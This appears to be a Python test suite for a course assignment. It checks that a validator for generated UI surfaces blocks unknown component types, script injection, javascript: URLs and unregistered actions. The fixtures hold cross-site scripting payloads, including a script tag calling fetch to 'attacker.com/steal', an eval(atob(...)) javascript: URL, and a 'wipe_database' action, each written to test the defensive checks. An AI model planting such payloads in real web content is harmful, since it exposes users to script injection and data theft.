"""Assignment 14 Security & Invariants Test Suite.

Proves:
  1. Catalog Invariant: Unknown / untrusted component types (e.g. RawHtml) are rejected.
  2. Data-not-Code Invariant: Markup injection (<script> tags), DOM handlers (onclick),
     or script URLs (javascript:) are blocked.
  3. Event Invariant: Actions outside the registered set are rejected.
  4. Custom Component Invariant: KanbanBoard is properly registered and accepted.
  5. Application Invariant: Multi-turn tutor app returns 100% valid catalog surfaces.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from s13code.ui.catalog import COMPONENTS, REGISTERED_ACTIONS, catalog_manifest
from s13code.ui.validator import Invariant, validate_surface
from s13code.apps.tutor_app import get_tutor_turn


def test_catalog_invariant_blocks_raw_html():
    surface = {
        "root": "c0",
        "components": [
            {"id": "c0", "type": "Column", "children": ["c1", "c2"]},
            {"id": "c1", "type": "Text", "text": {"$bind": "/title"}},
            {"id": "c2", "type": "RawHtml", "html": "<script>alert('pwned')</script>"},
        ],
        "dataModel": {"title": "Safe Heading"},
    }
    res = validate_surface(surface)
    assert not res.ok
    assert len(res.rejections) == 1
    assert res.rejections[0].component_id == "c2"
    assert res.rejections[0].invariant == Invariant.CATALOG
    assert any(c["id"] == "c1" for c in res.accepted)  # Safe Text sibling survives


def test_data_not_code_invariant_blocks_script_injection():
    surface = {
        "root": "c0",
        "components": [
            {"id": "c0", "type": "Text", "text": "<script>fetch('http://attacker.com/steal')</script>"},
        ],
    }
    res = validate_surface(surface)
    assert not res.ok
    assert res.rejections[0].invariant == Invariant.DATA_NOT_CODE


def test_data_not_code_invariant_blocks_javascript_urls():
    surface = {
        "root": "c0",
        "components": [
            {"id": "c0", "type": "Button", "label": "javascript:eval(atob('...'))"},
        ],
    }
    res = validate_surface(surface)
    assert not res.ok
    assert res.rejections[0].invariant == Invariant.DATA_NOT_CODE
    assert "script/data URL" in res.rejections[0].reason


def test_event_invariant_blocks_unregistered_actions():
    surface = {
        "root": "c0",
        "components": [
            {"id": "c0", "type": "Button", "label": "Execute", "onPress": {"action": "wipe_database"}},
        ],
    }
    res = validate_surface(surface)
    assert not res.ok
    assert res.rejections[0].invariant == Invariant.EVENT
    assert "unregistered action 'wipe_database'" in res.rejections[0].reason


def test_custom_kanban_board_registered_and_validates():
    assert "KanbanBoard" in COMPONENTS
    assert "move_card" in REGISTERED_ACTIONS
    assert "select_card" in REGISTERED_ACTIONS
    manifest = catalog_manifest()
    assert "KanbanBoard" in manifest["components"]
    assert "move_card" in manifest["actions"]

    surface = {
        "root": "k1",
        "components": [
            {
                "id": "k1",
                "type": "KanbanBoard",
                "title": "Project Sprint",
                "columns": "Todo,In Progress,Done",
                "cards": {"$bind": "/cards"},
                "onSelect": {"action": "select_card"},
            }
        ],
        "dataModel": {
            "cards": [{"id": "card1", "title": "Design UI", "status": "Todo"}]
        },
    }
    res = validate_surface(surface)
    assert res.ok, [r.as_dict() for r in res.rejections]


def test_tutor_app_multi_turn_surfaces_all_valid():
    for turn in (1, 2, 3):
        res = get_tutor_turn(turn)
        assert res["valid"], f"Turn {turn} failed validation: {res['validation_result']}"
        assert res["respond_as"] == "ui"
        assert len(res["surface"]["components"]) > 0


if __name__ == "__main__":
    test_catalog_invariant_blocks_raw_html()
    test_data_not_code_invariant_blocks_script_injection()
    test_data_not_code_invariant_blocks_javascript_urls()
    test_event_invariant_blocks_unregistered_actions()
    test_custom_kanban_board_registered_and_validates()
    test_tutor_app_multi_turn_surfaces_all_valid()
    print("ALL ASSIGNMENT 14 SECURITY & APPLICATION TESTS PASSED PERFECTLY!")
